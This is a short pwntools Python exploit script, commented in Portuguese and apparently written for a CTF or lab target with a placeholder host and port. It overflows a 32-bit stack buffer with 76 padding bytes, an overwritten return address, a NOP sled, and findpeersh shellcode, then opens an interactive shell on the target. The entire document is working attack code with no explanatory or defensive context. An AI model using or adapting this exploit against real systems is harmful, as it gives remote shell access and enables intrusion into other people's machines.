#!/usr/bin/env python3

from pwn import *

context(bits=32, arch='i386')
# Encontrar o offset correto
conn = remote('ip', port)

shellcode = asm(shellcraft.findpeersh())
#nopsled_address = p32(0xffffd0a0+20)
#nopsled_address = p32(0xffffd0e0)
#nopsled_address = p32(0xffffcca0)
esp_address = p32(0xffffcca0)
nop_sleds = b"\x90"*32

payload = b"A"*76
payload += esp_address
payload += nop_sleds
payload += shellcode

conn.sendline(payload)

# Abrir uma sess√£o interativa
conn.interactive()
